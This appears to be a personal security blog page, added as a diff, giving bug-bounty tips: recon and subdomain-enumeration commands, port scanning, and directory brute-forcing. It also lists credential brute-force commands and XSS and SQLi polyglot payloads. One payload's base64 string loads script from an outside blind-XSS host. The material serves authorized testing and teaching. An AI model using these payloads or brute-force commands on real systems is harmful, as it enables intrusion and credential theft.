@@ -1,0 +1,1081 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Bug Hunting Tips - iam.chi</title>
+<meta name="description" content="Author: Shankar">
+
+
+  <meta name="author" content="Chi Tran">
+  
+  <meta property="article:author" content="Chi Tran">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="iam.chi">
+<meta property="og:title" content="Bug Hunting Tips">
+<meta property="og:url" content="http://localhost:4000/bug-hunting/2019/02/07/bug-hunting-tips.html">
+
+
+  <meta property="og:description" content="Author: Shankar">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2019-02-07T00:00:00-06:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://localhost:4000/bug-hunting/2019/02/07/bug-hunting-tips.html">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": null,
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="iam.chi Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          iam.chi
+          
+        </a>
+        <ul class="visible-links"></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/images/bio-photo.jpg" alt="Chi Tran" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Chi Tran</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Hey! I am Chi | Father of 2 | Security Engineer | I love cooking and spicy noodles.</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+            <li><a href="mailto:research@ctrsec.io" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/remote-code-execution/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Linkedin</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/imspciynoodles" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Bug Hunting Tips">
+    <meta itemprop="description" content="Author: Shankar">
+    <meta itemprop="datePublished" content="2019-02-07T00:00:00-06:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Bug Hunting Tips
+</h1>
+          
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          7 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p>Author: Shankar</p>
+
+<p><strong>Pre-requisites Skills:</strong></p>
+
+<p><em>Linux basics</em></p>
+
+<p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers"><em>Basic idea about the HTTP protocols and its headers(Request and Response)</em></a></p>
+
+<p><a href="https://portswigger.net/burp/communitydownload"><em>(Burpsuite)</em></a></p>
+
+<p><strong>How to choose our target ?</strong></p>
+
+<p>We can choose our targets from bug bounty platforms like <a href="https://www.bugcrowd.com/"><strong>Bugcrowd</strong></a><strong>,</strong> <a href="https://www.hackerone.com/"><strong>Hackerone</strong></a><strong>,</strong> <a href="https://www.zerocopter.com/"><strong>Zerocopter</strong></a>, etc,</p>
+
+<p>Or we can find targets from the google by searching for <strong>responsible disclosure policy</strong> of a website.</p>
+
+<p><strong>We have a target then how to start ??</strong></p>
+
+<p>If you have chosen your target. then you should start finding the subdomain of the target.</p>
+
+<p>or we can start with the IP blocks of the targets which we can get from the ASN (some of the websites are mentioned in below)</p>
+
+<p><strong>Why we need subdomain?</strong></p>
+
+<p>Sometimes targeting the main domain is not possible to find bugs which will frustrated to the noobs. Because the top or other researchers are already found and reported the bugs to the target. For newbie should start with the other subdomains.</p>
+
+<p><strong>How to find Subdomains?</strong></p>
+
+<p>As per my recon I am using the following tools to find the subdomains for the target. (Commands are given below)</p>
+
+<p><a href="https://github.com/subfinder/subfinder">Subfinder</a></p>
+
+<p><a href="https://github.com/caffix/amass">Amass</a></p>
+
+<p><a href="https://github.com/aboul3la/Sublist3r">Sublist3r</a></p>
+
+<p><a href="https://github.com/michenriksen/aquatone">Aquatone</a></p>
+
+<p><a href="https://github.com/guelfoweb/knock">Knockpy</a></p>
+
+<p>In other words we can find subdomains using certificate transparency methodology</p>
+
+<p>From <a href="https://crt.sh/?q=%25.paypal.com">crt.sh</a>, <a href="https://censys.io/">censys.io</a>,<a href="https://www.shodan.io/">shodan.io</a>, google certificate transparency, facebook certificate transparency, and even CSP header etc.</p>
+
+<p>For more info: <a href="https://www.youtube.com/watch?v=McLdm4c1oLs&amp;list=PLIK9nm3mu-S6gCKmlC5CDFhWvbEX9fNW6&amp;index=4">https://www.youtube.com/watch?v=McLdm4c1oLs&amp;list=PLIK9nm3mu-S6gCKmlC5CDFhWvbEX9fNW6&amp;index=4</a></p>
+
+<p><strong>Subdomain Takeover Vulnerability:</strong></p>
+
+<p>In the community have already publish lots of writeups for subdomain takeover vulnerability So let me skip this part. If anybody needs this then let me know.</p>
+
+<p><a href="https://github.com/EdOverflow/can-i-take-over-xyz">https://github.com/EdOverflow/can-i-take-over-xyz</a></p>
+
+<p><strong>Discovering Target Using ASN (IP Blocks):</strong><br />
++++++++++++++++++++++++<br />
+<a href="http://bgp.he.net">http://bgp.he.net</a></p>
+
+<p><a href="https://whois.arin.net/ui/query.do">https://whois.arin.net/ui/query.do</a></p>
+
+<p><a href="https://apps.db.ripe.net/db-web-ui/#/fulltextsearch">https://apps.db.ripe.net/db-web-ui/#/fulltextsearch</a></p>
+
+<p><a href="https://reverse.report/">https://reverse.report/</a></p>
+
+<p><a href="https://www.shodan.io/search?query=org%3A%22Tesla+Motors%22">https://www.shodan.io/search?query=org%3A%22Tesla+Motors%22</a></p>
+
+<p>========================================</p>
+
+<p><strong>IP Range Finder Script: by sreeram KL (1337 method)</strong><br />
+ — — — — — — — — — — — — — — — — — — — — — — — —</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>**whois -h whois.radb.net — ‘-i origin AS45566’</td>
+      <td>grep -Eo “([0–9.]+){4}/[0–9]+”</td>
+      <td>head**</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>========================================</p>
+
+<p><strong>Brand / TLD Discovery:</strong><br />
+ — — — — — — — — — —</p>
+
+<p>This will increase the target scope by searching for a Aquiasition of a target</p>
+
+<p>Aquiasition — -&gt; <a href="https://www.crunchbase.com/search/acquisitions"><strong>crunchbase</strong></a>, wikipedia</p>
+
+<p>link discovery — -&gt;burp spidering</p>
+
+<p>weighted&amp; reverse tracker → domlink, builtwith</p>
+
+<p><strong>DomLink</strong><br />
+ — — — — — — <br />
+python domlink.py -d google.com -o google.out.txt</p>
+
+<p>========================================</p>
+
+<p>Trademark In Google: ” “Tesla © 2016” “Tesla © 2015” “Tesla © 2017” inurl:tesla</p>
+
+<p>========================================<br />
+<strong>Discovering New Targets</strong><br />
+(Subdomains)<br />
++++++++++++++++</p>
+
+<p><strong>Amass</strong><br />
+ — — — — — <br />
+amass -json out.json -d example.com</p>
+
+<p>========================================<br />
+<strong>Subfinder</strong> <br />
+ — — — — — —</p>
+
+<p>./subfinder -d example.com -o ./output.txt oT</p>
+
+<p>or</p>
+
+<p>docker run -v $HOME/.config/subfinder:/root/.config/subfinder -it subfinder -d example.com -o output.txt -nw -oA &gt; uber.com.txt</p>
+
+<p>========================================<br />
+<strong>Gobuster</strong><br />
+ — — — — —<br />
+time gobuster -m dns -u $TARGET.com -t 100 -w all.txt</p>
+
+<p>time ./subbrute.py /root/work/bin/all.txt $TARGET.com | ./bin/massdns -r resolvers.txt -t A -a -o -w massdns_output.txt - 
+========================================</p>
+
+<p><strong>Aquatone</strong><br />
+ — — — — — — — <br />
+aquatone-discover — domain example.com — threads 25</p>
+
+<p>aquatone-scan — domain example.com — ports huge -t 30</p>
+
+<p>aquatone-gather — domain example.com — threads 25</p>
+
+<p>========================================</p>
+
+<p><strong>Subdomain Enumberation</strong><br />
+ — — — — — — — — — — — — — — — — — — — — —</p>
+
+<p>These techniques are given by the awesome man <a href="https://twitter.com/0xbharath">Bharath</a></p>
+
+<p>Here you can find the original scripts <a href="https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration">https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration</a></p>
+
+<p><strong>Note: Kindly replace the API key used inside the scripts which may be an invalid which results in less amount of subdomains</strong></p>
+
+<h4 id="presentation">Presentation:</h4>
+
+<p>Slides are available at: <a href="https://speakerdeck.com/yamakira/esoteric-sub-domain-enumeration-techniques">https://speakerdeck.com/yamakira/esoteric-sub-domain-enumeration-techniques</a></p>
+
+<h4 id="video">Video</h4>
+
+<p>Video is available at: <a href="https://youtu.be/e_Gq99CKAys">https://youtu.be/e_Gq99CKAys</a></p>
+
+<p><strong>Subdomain Enumeration with the SPF record</strong></p>
+
+<p>python assets_from_SPF.py google.com<br />
+========================================</p>
+
+<p><strong>Using Censys</strong><br />
+ — — — — — — — — — — <br />
+ python censys_enumeration.py domain.txt<br />
+========================================</p>
+
+<p><strong>Using CSP</strong><br />
+ — — — — — — — — — — <br />
+ python csp_parser.py google.com -r</p>
+
+<p>========================================</p>
+
+<p><strong>Rapid 7 Forward DNS dataset</strong><br />
+ — — — — — — — — — — — — — — — —</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>curl -silent <a href="https://scans.io/data/rapid7/sonar.fdns_v2/20170417-fdns.json.gz">https://scans.io/data/rapid7/sonar.fdns_v2/20170417-fdns.json.gz</a></td>
+      <td>pigz -dc</td>
+      <td>grep “.icann.org”</td>
+      <td>jq</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>========================================<br />
+<strong>DNSrecon</strong><br />
+ — — — — — — <br />
+python dnsrecon.py -n ns1.insecuredns.com -d insecuredns.com -D subdomains-top1mil-5000.txt -t brt</p>
+
+<p>========================================<br />
+<strong>ALTDNS</strong><br />
+ — — — — — — <br />
+python altdns.py -i icann.domains -o data_output -w icann.words -r -s results_output.txt</p>
+
+<p>========================================</p>
+
+<p><strong>Zone transfer using dig</strong><br />
+ — — — — — — — — — — —</p>
+
+<p>dig +multi AXFR <a href="http://twitter.com/ns1">@ns1</a>.insecuredns.com insecuredns.com<br />
+========================================<br />
+<strong>DNSSEC</strong><br />
+ — — — — — — — — — <br />
+dig +multi +dnssec A paypal.com</p>
+
+<p>dig +dnssec <a href="http://twitter.com/ns1">@ns1</a>.insecuredns.com firewall.insecuredns.com<br />
+========================================<br />
+<strong>Zone walking NSEC — LDNS</strong><br />
+ — — — — — — — — — — — — — <br />
+$ ldns-walk <a href="http://twitter.com/name_server">@name_server</a> domain_name<br />
+========================================</p>
+
+<p><strong>Zone walking NSEC — Dig</strong><br />
+ — — — — — — — — — — — — <br />
+ You can list all the sub-domains by following the linked list of NSEC records of existing domains.</p>
+
+<p>$ dig +short NSEC api.nasa.gov</p>
+
+<p>$ dig +short NSEC apm.nasa.gov</p>
+
+<p>========================================<br />
+<strong>Extracting the sub-domain from NSEC</strong><br />
+ — — — — — — — — — — — — — — — — — —</p>
+
+<p>dig +short NSEC api.nasa.gov | awk ‘{print $1;}’<br />
+apm.nasa.gov.<br />
+========================================</p>
+
+<p><strong>Zone walking NSEC3</strong><br />
+ — — — — — — — — — — — <br />
+Zone walking NSEC3 protected zone using nsec3walker:</p>
+
+<p># Collect NSEC3 hashes of a domain<br />
+$ ./collect insecuredns.com &gt; insecuredns.com.collect</p>
+
+<p># Undo the hashing, expose the sub-domain information.<br />
+$ ./unhash &lt; insecuredns.com.collect &gt; insecuredns.com.unhash</p>
+
+<p>========================================</p>
+
+<p><strong>Zone walking NSEC</strong>3<br />
+ — — — — — — — — — — <br />
+# Checking the number of sucessfully cracked sub-domain hashes<br />
+$ cat icann.org.unhash | grep “icann” | wc -l<br />
+45</p>
+
+<p># Listing only the sub-domain part from the unhashed data<br />
+$ cat icann.org.unhash | grep “icann” | awk ‘{print $2;}’</p>
+
+<p>========================================</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>dig +short TXT icann.org</td>
+      <td>grep spf</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>========================================</p>
+
+<p><strong>MASSDNS</strong></p>
+
+<p>./bin/massdns -r resolvers.txt -t AAAA -w results.txt domains.txt</p>
+
+<p>========================================</p>
+
+<p><strong>Port Scanning:</strong></p>
+
+<p>The port scanning is very important to find the running in unfamiliar or standard ports the target.</p>
+
+<p>For port scanning I have used <strong>NMAP</strong> and <strong>Masscan</strong> and <strong>Aquatone scan</strong>.</p>
+
+<p>Then some researcher start checking for subdomain takeover vulnerability once they found subdomains which running on the usual or usual ports.</p>
+
+<p><strong>Enumerating Targets(Port Scanning)</strong><br />
+++++++++++++++++++++</p>
+
+<p><strong>Masscan</strong><br />
+ — — — — —</p>
+
+<p>masscan -p1–65535 -iL $TARGET_LIST — max-rate 10000 -oG $TARGET_OUTPUT</p>
+
+<p>========================================</p>
+
+<p><strong>NMAP</strong><br />
+ — — — —</p>
+
+<p>nmap -S 192.168.0.1 -d — max-scan-delay 10 -oA logs/tcp-allports-%T-%D -iL tcp-allports-1M-ips — max-retries 1 — randomize-hosts -p- -PS21,22,23,25,53,80,443 -T4 — min-hostgroup 256</p>
+
+<p>========================================</p>
+
+<p><strong>Visual Identification</strong><br />
++++++++++++++++</p>
+
+<p>This part will help us to find a application which is running on standard or non-standard ports on the target machine.</p>
+
+<p>The following tools are grabbing banner if they found on the target machine which is running on specific ports. That will help us to sort list our target subdomains.</p>
+
+<p><strong>Eyewitness</strong><br />
+ — — — — — —<br />
+eyewitness -f urls.txt — web</p>
+
+<p>========================================</p>
+
+<p><strong>Wayback Enumeration →&gt; waybackurl</strong><br />
++++++++++++++++++++++++</p>
+
+<p>This technology will help us if we seen any one of the http responses like 401,403,404. This will show you the old stored data using Archive.</p>
+
+<p>Here we can find some sensitive information even the target page is not currently accessible.<br />
+https://archieve.org/web</p>
+
+<p><strong>ReconCat</strong><br />
+ — — — — — — —</p>
+
+<p>php recon -y2012 — url=<a href="https://github.com">https://github.com</a> -t10 (fetch snapshot of year 2012 of github with 10 threads)</p>
+
+<p>========================================<br />
+<strong>waybackurls</strong><br />
+ — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — - 
+python waybackurls.py — help</p>
+
+<p>========================================<br />
+<strong>waybackunifier</strong><br />
+ — — — — — —<br />
+./waybackunifier — help<br />
+========================================</p>
+
+<p><strong>Parsing JavaScript</strong><br />
+++++++++++++</p>
+
+<p>Parsing JS is very useful to find the directories which is used by the target. we can use these type of tools instead of brute-forcing the directory list on the target</p>
+
+<p>Note: Brute-Forcing of directory also good thing to do. Always use the multiple techniques to find the directory from the targets</p>
+
+<p><strong>Jsparser</strong><br />
+ — — — — — — — —</p>
+
+<p>Run handler.py and then visit <a href="http://localhost:8008">http://localhost:8008</a>.<br />
+========================================<br />
+<strong>linkfinder</strong><br />
+ — — — — — — <br />
+python linkfinder.py -i <a href="https://example.com">https://example.com</a> -d /* Will analyze the entire domain’s JS files */</p>
+
+<p>python linkfinder.py -i <a href="https://example.com/1.js">https://example.com/1.js</a> -o results.html</p>
+
+<p>========================================<br />
+<strong>DIRsearch</strong><br />
+ — — — — — —</p>
+
+<p>python3 dirsearch.py — help<br />
+========================================</p>
+
+<p><strong>Dirb:</strong></p>
+
+<p>dirb <a href="https://target.com/">https://target.com/</a></p>
+
+<p>And Use DirBuster Also</p>
+
+<p><strong>Content Discovery</strong><br />
+++++++++++++<br />
+Gobuster <br />
+Burp content discovery<br />
+Robots disallowed</p>
+
+<p>========================================<br />
+<strong><em>Seclists / RAFT / Digger word-lists will help us to find the word-lists for appropriate attacks</em></strong><br />
+++++++++++++++++++++++++++++++++++++++++</p>
+
+<p><strong>Parameter Bruting?</strong><br />
++++++++++++</p>
+
+<p>Parameter brute-forcing will helpful to find the vulnerabilities. Becoz there is no protection on those parameters compared to the usual one. You should try this methods once.<br />
+<strong>parameth</strong><br />
+ — — — — — —</p>
+
+<p>parameth.py -u example.com/login.php -t 30 -o output.txt</p>
+
+<p>========================================</p>
+
+<p><strong>credential bruteforce</strong><br />
+++++++++++++</p>
+
+<p>These tools are having the ability to brute-force the different type of protocols like http, ssh,smtp, etc</p>
+
+<p><strong>Brutespray</strong><br />
+python brutespray.py — file nmap.gnmap -U /usr/share/wordlist/user.txt -P /usr/share/wordlist/pass.txt — threads 5 — hosts 5</p>
+
+<p>========================================<br />
+<strong>MEDUSA</strong><br />
+ — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — <br />
+medusa -h 192.168.1.1 -u “admin” -P c:/file/directory/hugewordlist.txt -M http</p>
+
+<p>========================================</p>
+
+<p><strong>Technology Identification and Vulnerability findings:</strong></p>
+
+<p>Here I used <strong>Wappalyzer</strong> and <strong>build with</strong> add-ons on the browsers. <a href="https://tools.kali.org/web-applications/whatweb"><strong>Whatweb</strong></a> tool also I used to find the what technologies they used on the target.</p>
+
+<p>The following tools to find technologies and technology based vulnerabilities on the target</p>
+
+<p><strong>WPScan</strong><br />
+ — — — —</p>
+
+<p>wpscan — url <a href="http://www.example.com">www.example.com</a></p>
+
+<p>========================================<br />
+<strong>cmsmap</strong><br />
+ — — — — — — <br />
+ cmsmap.py -t <a href="https://example.com">https://example.com</a> -o output.txt<br />
+ <br />
+ cmsmap.py -t <a href="https://example.com">https://example.com</a> -u admin -p passwords.txt<br />
+ <br />
+ cmsmap.py -k hashes.txt -w passwords.txt</p>
+
+<p>========================================</p>
+
+<p><strong>Github Recon to find juicy information about the target</strong><br />
+++++++++++++++++++++++++++++++</p>
+
+<p>We can use github to find sensitive information like RSA key,API Key, Source-code with the default credentials and the databases etc. The following tools will reduce the analysis time. but the manual finding is always good.</p>
+
+<p><strong>Gitrob</strong></p>
+
+<p>./gitrob google</p>
+
+<p>To see the result go to browser and type localhost:9393<br />
+========================================</p>
+
+<p><strong>Trufflehog</strong><br />
+++++++++++</p>
+
+<p>trufflehog <a href="https://github.com/SeppPenner/postgres.git">https://github.com/SeppPenner/postgres.git</a></p>
+
+<p>========================================</p>
+
+<p><strong>Git Repo DORKS</strong> <br />
+ — — — — — — — —<br />
+<a href="https://github.com/techgaun/github-dorks">https://github.com/techgaun/github-dorks</a></p>
+
+<p><a href="https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt">https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt</a></p>
+
+<p>========================================</p>
+
+<p><strong>How to start testing for a bug ??</strong></p>
+
+<p>The testing is based on our opinion. some of them start with the xss and other vulnerabilities which we can easily found from the target.</p>
+
+<p>Still you are stuck with the testing for a bug means you can start reading the following books which always helpful for Bug hunter or Application Penetration Tester.</p>
+
+<p>1,<a href="https://www.amazon.in/Web-Application-Hackers-Handbook-Exploiting/dp/8126533404">https://www.amazon.in/Web-Application-Hackers-Handbook-Exploiting/dp/8126533404</a></p>
+
+<p>2,<a href="https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents">https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents</a></p>
+
+<p>3,<a href="https://leanpub.com/web-hacking-101">https://leanpub.com/web-hacking-101</a></p>
+
+<p>I hope these books are very helpful for how to test for a bugs</p>
+
+<p><strong>Polyglot paylots:</strong></p>
+
+<p><strong>XSS</strong><br />
+ — — —</p>
+
+<p>%3C!%27/*!%22/*!\%27/*\%22/* — !%3E%3C/Title/%3C/script/%3E%3CInput%20Type=Text%20Style=position:fixed;top:0;left:0;font-size:999px%20*/;%20Onmouseenter=confirm`1`%20//%3E#</p>
+
+<p>&lt;!’/*!”/*!\’/*\”/* — !&gt;&lt;/Title/&lt;/script/&gt;&lt;Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px */; Onmouseenter=confirm`1` //&gt;#</p>
+
+<p>jaVasCript:/*-/*`/*\`/*’/*”/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/ — !&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</p>
+
+<p>“»<marquee>&lt;img src=x onerror=confirm(1)&gt;</marquee>” &gt;&lt;/plaintext\&gt;&lt;/|\&gt;&lt;plaintext/onmouseover=prompt(1) &gt;<script>prompt(1)</script><a href="http://twitter.com/gmail">@gmail</a>.com&lt;isindex formaction=javascript:alert(/XSS/) type=submit&gt;’ →” &gt;<br />
+“&gt;&lt;/script&gt;<script>alert(1)</script>”&gt;&lt;img/id=”confirm&amp;lpar; 1)”/alt=”/”src=”/”onerror=eval(id&amp;%23x29;&gt;’”&gt;”&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYnhzcy54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))&gt;</p>
+
+<p>“ onclick=alert(1)//&lt;button ‘ onclick=alert(1)//&gt; */ alert(1)//</p>
+
+<p>‘;alert(String.fromCharCode(88,83,83))//’;alert(String. fromCharCode(88,83,83))//”;alert(String.fromCharCode (88,83,83))//”;alert(String.fromCharCode(88,83,83))// →&lt;/SCRIPT&gt;”&gt;’&gt;<script>alert(String.fromCharCode(88,83,83)) </script><br />
+========================================</p>
+
+<p><strong>SQLi Polyglot:</strong><br />
+ — — — — — — — — —</p>
+
+<p>SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/</p>
+
+<p>‘%2Bbenchmark(3200,SHA1(1))%2B’</p>
+
+<p>‘+BENCHMARK(40000000,SHA1(1337))+’</p>
+
+<p>========================================</p>
+
+<p><strong>SSTI (Server Side Template Injection)</strong><br />
+++++++++++++++++++++++++</p>
+
+<p><strong>TPLMap<br />
+ — — — —</strong> — — — —</p>
+
+<p>./tplmap.py -u ‘<a href="http://www.target.com/page?name=John%27">http://www.target.com/page?name=John’</a></p>
+
+<p>========================================</p>
+
+<p>Special Thanks to:</p>
+
+<p><a href="https://www.facebook.com/rahulr4j">Rahul Raj</a>,<a href="https://www.facebook.com/lawway09">Velayutham Selvaraj</a>,<a href="https://www.facebook.com/havocgwen">havoc Guhan</a>, <a href="https://www.facebook.com/sreeram.kl">Sreeram KL</a>(This guy is awesome and one of my favorite &amp; emerging hunter),<a href="https://www.facebook.com/kishorethouguluvakumaran">Kishore T K</a>,<a href="https://www.facebook.com/hackerone.net">Sai Naik</a>,<a href="https://www.facebook.com/alirazzaqlive">Ali Razzaq</a>, <a href="https://www.facebook.com/MuhammadKhizerJaved33">M Khizer Javed</a>, <a href="https://www.facebook.com/vishnuprasadnta">Vishnu Prasad</a>, Pethu Raj,phwd, Jason Haddix, Frans Rosen, Mathias, Zseano,,<a href="https://twitter.com/albinowax">James Kettle</a>,Filedescriptor, Stok etc.</p>
+
+<p>I always thank to every mates for providing their finding to the community.</p>
+
+<p><strong>Reference</strong> and I started with this following videos and I suggested to watch noobs to understand what is going on in Bug Hunting :</p>
+
+<p>XSS:</p>
+
+<p>https://www.youtube.com/watch?v=LLtOJNeMp7c</p>
+
+<p>https://www.youtube.com/watch?v=TKn5qdti66c</p>
+
+<p>https://www.youtube.com/watch?v=lXn1nU01ufI</p>
+
+<p>https://www.youtube.com/watch?v=dWLpw-7_pa8</p>
+
+<p>Oauth:</p>
+
+<p>https://youtu.be/X0mV9HXbKHY</p>
+
+<p>Bug bounty Tips:</p>
+
+<p>https://www.youtube.com/watch?list=PLIK9nm3mu-S6gCKmlC5CDFhWvbEX9fNW6&amp;v=Qw1nNPiH_Go</p>
+
+<p>https://www.youtube.com/watch?v=BEaMhs9LmoY</p>
+
+<p>https://www.youtube.com/watch?v=1Kg0_53ZEq8</p>
+
+<p><strong>Miscellaneous</strong></p>
+
+<p>https://www.youtube.com/watch?v=KDo68Laayh8</p>
+
+<p>Good writeups:</p>
+
+<p><a href="https://github.com/ngalongc/bug-bounty-reference">https://github.com/ngalongc/bug-bounty-reference</a><br />
+<a href="https://pentester.land/list-of-bug-bounty-writeups.html">https://pentester.land/list-of-bug-bounty-writeups.html</a><br />
+<a href="https://hackerone.com/hacktivity?sort_type=popular&amp;filter=type%3Aall&amp;querystring=&amp;page=1">https://hackerone.com/hacktivity?sort_type=popular&amp;filter=type%3Aall&amp;querystring=&amp;page=1</a></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-02-07T00:00:00-06:00">February 7, 2019</time></p>
+
+
+      </footer>
+
+      <section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=Bug+Hunting+Tips%20http%3A%2F%2Flocalhost%3A4000%2Fbug-hunting%2F2019%2F02%2F07%2Fbug-hunting-tips.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fbug-hunting%2F2019%2F02%2F07%2Fbug-hunting-tips.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fbug-hunting%2F2019%2F02%2F07%2Fbug-hunting-tips.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/hackthebox/2018/12/23/htb-chaos.html" class="pagination--pager" title="[HTB Writeups] - Chaos
+">Previous</a>
+    
+    
+      <a href="/bug-hunting/2019/03/06/web-application-pentesting-vietnamese.html" class="pagination--pager" title="Web Application Pentesting (Vietnamese)
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
